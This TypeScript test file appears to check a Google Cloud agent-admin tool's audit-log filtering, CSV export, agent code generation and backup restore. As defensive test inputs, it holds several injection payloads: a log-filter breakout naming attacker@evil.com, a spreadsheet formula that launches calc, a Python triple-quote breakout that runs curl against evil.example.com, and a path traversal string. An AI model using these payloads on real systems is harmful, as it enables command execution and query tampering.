/**
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { execFileSync } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  buildAdminAuditLogFilter,
  escapeLoggingFilterValue,
  exportAuditLogsToCsv,
  fetchAdminAuditLogs,
  isAuditLogPermissionError,
  parseAuditLogEntry,
} from './auditLogs';
import * as core from './core';
import { GapiError } from './core';
import { generateMainPy } from '../adkTemplates/a2aTemplate';
import { generateAdkPythonCode } from '../adkTemplates/agentTemplate';
import { AdkAgentConfig } from '../adkTemplates/types';
import { createGithubRepo } from '../githubApiCache';
import { restoreAgentsIntoAssistant, executeRestoreDiscovery } from '../backup/restoreOperations';
import * as apiService from '../apiService';
import { Agent, AppEngine, Collection, DataStore } from '../../types';

vi.mock('./core', async (importOriginal) => {
  const actual = await importOriginal<typeof import('./core')>();
  return {
    ...actual,
    gapiRequest: vi.fn(),
  };
});

describe('Cloud Audit Logs API Service (services/api/auditLogs.ts)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('escapes quotes, backslashes, and newlines in Cloud Logging filter values to prevent LQL breakout', () => {
    const hostilePrincipal = 'attacker@evil.com" OR logName:"projects/x/logs/*"\n--';
    const escaped = escapeLoggingFilterValue(hostilePrincipal);
    expect(escaped).toBe('attacker@evil.com\\" OR logName:\\"projects/x/logs/*\\" --');
    expect(escaped).not.toContain('\n');

    const filter = buildAdminAuditLogFilter({
      projectId: 'corp-sec-prod',
      timeWindow: '24h',
      principalEmail: hostilePrincipal,
      methodName: 'Update" OR 1=1',
      nowMs: Date.parse('2026-11-19T12:00:00.000Z'),
    });

    expect(filter).toContain(
      'logName:("logs/cloudaudit.googleapis.com%2Factivity" OR "logs/cloudaudit.googleapis.com%2Fpolicy")'
    );
    expect(filter).toContain(
      'protoPayload.serviceName:("discoveryengine.googleapis.com" OR "modelarmor.googleapis.com" OR "agentregistry.googleapis.com" OR "aiplatform.googleapis.com")'
    );
    expect(filter).toContain('timestamp>="2026-11-18T12:00:00.000Z"');
    expect(filter).toContain(
      'protoPayload.authenticationInfo.principalEmail:"attacker@evil.com\\" OR logName:\\"projects/x/logs/*\\" --"'
    );
    expect(filter).toContain('protoPayload.methodName:"Update\\" OR 1=1"');
  });

  it('rejects empty or malformed project identifiers with an explicit error', async () => {
    await expect(fetchAdminAuditLogs({ projectId: '   ' })).rejects.toThrow(
      /Invalid GCP project identifier/
    );
    await expect(
      fetchAdminAuditLogs({ projectId: 'bad/project/../../etc' })
    ).rejects.toThrow(/Invalid GCP project identifier/);
    expect(core.gapiRequest).not.toHaveBeenCalled();
  });

  it('calls POST https://logging.googleapis.com/v2/entries:list and parses AuditLog protoPayloads', async () => {
    vi.mocked(core.gapiRequest).mockResolvedValueOnce({
      entries: [
        {
          insertId: 'ins-001',
          logName: 'projects/acme-prod/logs/cloudaudit.googleapis.com%2Factivity',
          timestamp: '2026-11-19T10:15:30Z',
          severity: 'NOTICE',
          protoPayload: {
            '@type': 'type.googleapis.com/google.cloud.audit.AuditLog',
            serviceName: 'discoveryengine.googleapis.com',
            methodName: 'google.cloud.discoveryengine.v1alpha.AgentService.CreateAgent',
            resourceName:
              'projects/acme-prod/locations/global/collections/default_collection/engines/eng-1/assistants/default_assistant/agents/agt-9',
            authenticationInfo: {
              principalEmail: 'sre-admin@acme.com',
            },
            requestMetadata: {
              callerIp: '203.0.113.42',
            },
            status: { code: 0 },
            request: { displayName: 'Finance Agent' },
            response: { name: 'agents/agt-9', state: 'ENABLED' },
          },
        },
        {
          insertId: 'ins-002',
          logName: 'projects/acme-prod/logs/cloudaudit.googleapis.com%2Fpolicy',
          timestamp: '2026-11-19T09:00:00Z',
          severity: 'NOTICE',
          protoPayload: {
            serviceName: 'discoveryengine.googleapis.com',
            methodName: 'SetIamPolicy',
            resourceName: 'projects/acme-prod/locations/global/agents/agt-9',
            authenticationInfo: { principalEmail: 'sec-lead@acme.com' },
            serviceData: {
              policyDelta: {
                bindingDeltas: [
                  { action: 'ADD', role: 'roles/discoveryengine.viewer', member: 'group:eng@acme.com' },
                ],
              },
            },
          },
        },
      ],
      nextPageToken: 'next-tok-2',
    });

    const res = await fetchAdminAuditLogs({
      projectId: 'acme-prod',
      timeWindow: '7d',
      pageSize: 50,
    });

    expect(core.gapiRequest).toHaveBeenCalledWith(
      'https://logging.googleapis.com/v2/entries:list',
      'POST',
      'acme-prod',
      undefined,
      expect.objectContaining({
        resourceNames: ['projects/acme-prod'],
        orderBy: 'timestamp desc',
        pageSize: 50,
      })
    );

    expect(res.nextPageToken).toBe('next-tok-2');
    expect(res.entries).toHaveLength(2);
    expect(res.entries[0]).toMatchObject({
      id: 'ins-001',
      logType: 'ADMIN_ACTIVITY',
      serviceName: 'discoveryengine.googleapis.com',
      principalEmail: 'sre-admin@acme.com',
      callerIp: '203.0.113.42',
      request: { displayName: 'Finance Agent' },
    });
    expect(res.entries[1].logType).toBe('POLICY');
    expect(res.entries[1].policyDelta).toEqual({
      bindingDeltas: [
        { action: 'ADD', role: 'roles/discoveryengine.viewer', member: 'group:eng@acme.com' },
      ],
    });
  });

  it('propagates 403 PERMISSION_DENIED errors without swallowing or returning fake data and classifies them accurately', async () => {
    const gapi403 = new GapiError(
      'Caller does not have required permission logging.logEntries.list',
      403,
      'PERMISSION_DENIED'
    );
    vi.mocked(core.gapiRequest).mockRejectedValueOnce(gapi403);

    await expect(
      fetchAdminAuditLogs({ projectId: 'restricted-prod', timeWindow: '24h' })
    ).rejects.toThrow(/logging\.logEntries\.list/);

    expect(isAuditLogPermissionError(gapi403)).toBe(true);
    expect(isAuditLogPermissionError(new Error('500 Internal Server Error'))).toBe(false);
  });

  it('exports CSV with RFC-4180 quoting and neutralizes spreadsheet formula injection', () => {
    const parsed = parseAuditLogEntry({
      timestamp: '2026-11-19T12:00:00Z',
      logName: 'projects/p/logs/cloudaudit.googleapis.com%2Factivity',
      severity: 'ERROR',
      protoPayload: {
        serviceName: 'modelarmor.googleapis.com',
        methodName: 'UpdateTemplate',
        resourceName: '=cmd|\' /C calc\'!A0',
        authenticationInfo: { principalEmail: 'admin@corp.com' },
        status: { code: 7, message: 'Denied, "quoted" reason' },
      },
    });

    const csv = exportAuditLogsToCsv([parsed]);
    const lines = csv.split('\n');
    expect(lines).toHaveLength(2);
    // Formula-prefixed resourceName must be neutralized with a leading apostrophe
    expect(lines[1]).toContain("'=cmd|' /C calc'!A0");
    // Embedded quotes and commas must be RFC-4180 quoted
    expect(lines[1]).toContain('"Denied, ""quoted"" reason"');
  });
});

describe('Security, Backup/DR & ADK Studio Regression Suite', () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('neutralizes triple-quote Python code injection in A2A generateMainPy and passes python3 py_compile', () => {
    const hostileInstruction =
      'Be helpful."""\nimport os; os.system("curl https://evil.example.com/pwn")\nx = """';
    const pySource = generateMainPy({
      serviceName: 'sec-a2a',
      displayName: 'Sec A2A',
      providerOrganization: 'Corp',
      model: 'gemini-2.5-flash',
      region: 'us-central1',
      memory: '512Mi',
      instruction: hostileInstruction,
      enableCors: false,
      useGoogleSearch: false,
      tools: [],
    });

    // Must not contain raw unescaped `"""` breakout around os.system
    expect(pySource).not.toContain('\nimport os; os.system(');
    expect(pySource).toContain('DEFAULT_SYSTEM_INSTRUCTION = "Be helpful.\\"\\"\\"\\nimport os;');

    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'a2a-sec-test-'));
    const mainPyPath = path.join(tmpDir, 'main.py');
    fs.writeFileSync(mainPyPath, pySource, 'utf8');
    try {
      execFileSync('python3', ['-m', 'py_compile', mainPyPath], { stdio: 'pipe' });
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('emits real Model Armor :sanitizeUserPrompt callback in ADK agentTemplate.ts and compiles cleanly', () => {
    const code = generateAdkPythonCode({
      adkVersion: '1.35.1',
      name: 'armored_agent',
      description: 'Protected agent',
      model: 'gemini-2.5-flash',
      instruction: 'Follow policy.',
      tools: [],
      useGoogleSearch: false,
      enableOAuth: false,
      authId: '',
      allowAdcFallback: true,
      enableDiscoveryApi: false,
      discoveryConfig: {
        projectId: 'p',
        location: 'global',
        collection: 'default_collection',
        engineId: 'e',
        dataStoreIds: '',
      },
      enableBqAnalytics: false,
      bqDatasetId: '',
      bqTableId: '',
      enableThinking: false,
      thinkingBudget: 1024,
      thinkingLevel: 'HIGH',
      enableStreaming: false,
      enableBigQueryMcp: false,
      enableCodeExecution: false,
      enableGraphvizRendering: false,
      enableEmailTool: false,
      enableSecurityCommandCenterApi: false,
      enableRecommenderApi: false,
      enableServiceHealthApi: false,
      enableNetworkManagementApi: false,
      enableCloudAssistApi: false,
      enableCloudLoggingApi: false,
      enableCloudMonitoringApi: false,
      enableCloudRunApi: false,
      enableResourceManagerApi: false,
      enableAdminActivityApi: false,
      enableDatabaseFleetApi: false,
      enableCloudLoggingMcp: false,
      enableBigtableAdminMcp: false,
      enableCloudSqlMcp: false,
      enableCloudMonitoringMcp: false,
      enableComputeEngineMcp: false,
      enableFirestoreMcp: false,
      enableGkeMcp: false,
      enableResourceManagerMcp: false,
      enableSpannerMcp: false,
      enableDeveloperKnowledgeMcp: false,
      enableMapsGroundingMcp: false,
      enableTelemetry: false,
      enableMessageLogging: false,
      enableEvaluation: false,
      enableCiCd: false,
      ciCdRunner: 'none',
      deploymentTarget: 'agent_engine',
      enableModelArmor: true,
      modelArmorTemplate: 'projects/sec-proj/locations/us-central1/templates/strict-guard',
      customMcpEndpoints: [],
    } as AdkAgentConfig);

    expect(code).toContain(':sanitizeUserPrompt');
    expect(code).toContain('modelarmor.{loc}.rep.googleapis.com');
    expect(code).toContain('AuthorizedSession');
    expect(code).toContain('filter_match_state == "MATCH_FOUND"');
    expect(code).toContain('return LlmResponse(');
  });

  it('routes createGithubRepo to /orgs/{owner}/repos when owner differs from /user login and defaults to private=true', async () => {
    const fetchSpy = vi
      .spyOn(globalThis, 'fetch')
      .mockResolvedValueOnce(
        new Response(JSON.stringify({ login: 'personal-user' }), { status: 200 })
      )
      .mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 1, full_name: 'corp-org/actions-templates' }), {
          status: 201,
        })
      );

    await createGithubRepo(
      'ghp_test_token',
      'actions-templates',
      'Shared templates',
      true,
      'corp-org'
    );

    expect(fetchSpy).toHaveBeenCalledTimes(2);
    expect(fetchSpy.mock.calls[0][0]).toBe('https://api.github.com/user');
    expect(fetchSpy.mock.calls[1][0]).toBe('https://api.github.com/orgs/corp-org/repos');
    const postBody = JSON.parse(String(fetchSpy.mock.calls[1][1]?.body));
    expect(postBody.private).toBe(true);
  });

  it('preserves regional reasoningEngine location (never global) plus dataStoreSpecs, dataConnectors, observabilityConfig, and AppEngine controls on restore', async () => {
    vi.useFakeTimers();
    try {
      const createAgentSpy = vi
        .spyOn(apiService, 'createAgent')
        .mockResolvedValueOnce({ name: 'projects/dr-proj/.../agents/restored-1' } as Agent);
      const createColSpy = vi
        .spyOn(apiService, 'createCollection')
        .mockResolvedValueOnce({} as never);
      const createEngineSpy = vi
        .spyOn(apiService, 'createEngine')
        .mockResolvedValueOnce({ name: 'op-1', done: true } as never);

      const adkAgent: Agent = {
        name: 'projects/src-proj/locations/global/collections/default_collection/engines/eng-1/assistants/default_assistant/agents/agt-1',
        displayName: 'Regional ADK Agent',
        observabilityConfig: { observabilityEnabled: true, sensitiveLoggingEnabled: false },
        dataStoreSpecs: {
          specs: [
            {
              dataStore:
                'projects/src-proj/locations/global/collections/default_collection/dataStores/kb-1',
            },
          ],
        },
        dataConnectors: [
          {
            name: 'projects/src-proj/locations/global/collections/slack-col/dataConnector',
            dataSource: 'slack',
          },
        ],
        adkAgentDefinition: {
          toolSettings: { toolDescription: 'Query ADK' },
          provisionedReasoningEngine: {
            reasoningEngine: 'projects/src-proj/locations/us-central1/reasoningEngines/555666',
          },
        },
      };

      const agentPromise = restoreAgentsIntoAssistant(
        [adkAgent],
        {
          projectId: 'dr-proj',
          appLocation: 'global',
          collectionId: 'default_collection',
          appId: 'eng-1',
          assistantId: 'default_assistant',
          // Even when appLocation is 'global' and reasoningEngineLocation is unset, must keep 'us-central1'!
        },
        () => {},
        async () => null
      );
      await vi.runAllTimersAsync();
      await agentPromise;

      expect(createAgentSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          adkAgentDefinition: expect.objectContaining({
            provisionedReasoningEngine: {
              reasoningEngine: 'projects/dr-proj/locations/us-central1/reasoningEngines/555666',
            },
          }),
          observabilityConfig: { observabilityEnabled: true, sensitiveLoggingEnabled: false },
          dataStoreSpecs: {
            specs: [
              {
                dataStore:
                  'projects/dr-proj/locations/global/collections/default_collection/dataStores/kb-1',
              },
            ],
          },
          dataConnectors: [
            {
              name: 'projects/dr-proj/locations/global/collections/slack-col/dataConnector',
              dataSource: 'slack',
            },
          ],
        }),
        expect.anything(),
        undefined
      );

      // Verify AppEngine restore preserves features, modelConfigs, observabilityConfig, agentCreationConfig, agentControlConfig
      const discoveryPromise = executeRestoreDiscovery(
        {
          collections: [
            {
              name: 'projects/src-proj/locations/global/collections/default_collection',
              displayName: 'Default Collection',
              dataStores: [] as DataStore[],
              engines: [
                {
                  name: 'projects/src-proj/locations/global/collections/default_collection/engines/eng-gov',
                  displayName: 'Governed Engine',
                  solutionType: 'SOLUTION_TYPE_CHAT',
                  features: { 'agent-sharing': 'FEATURE_STATE_ON' },
                  modelConfigs: { 'gemini-2.5-pro': 'MODEL_ENABLED' },
                  observabilityConfig: { observabilityEnabled: true },
                  agentCreationConfig: { maxUserAgentCount: 25 },
                  agentControlConfig: { personal: { creationEnabled: true } },
                } as AppEngine,
              ],
            } as Collection,
          ],
        },
        {
          projectId: 'dr-proj',
          appLocation: 'global',
          collectionId: 'default_collection',
          appId: 'eng-gov',
        },
        () => {},
        async () => {}
      );
      await vi.runAllTimersAsync();
      await discoveryPromise;

      expect(createColSpy).toHaveBeenCalledTimes(1);
      expect(createEngineSpy).toHaveBeenCalledWith(
        'eng-gov',
        expect.objectContaining({
          features: { 'agent-sharing': 'FEATURE_STATE_ON' },
          modelConfigs: { 'gemini-2.5-pro': 'MODEL_ENABLED' },
          observabilityConfig: { observabilityEnabled: true },
          agentCreationConfig: { maxUserAgentCount: 25 },
          agentControlConfig: { personal: { creationEnabled: true } },
        }),
        expect.anything()
      );
    } finally {
      vi.useRealTimers();
    }
  });
});
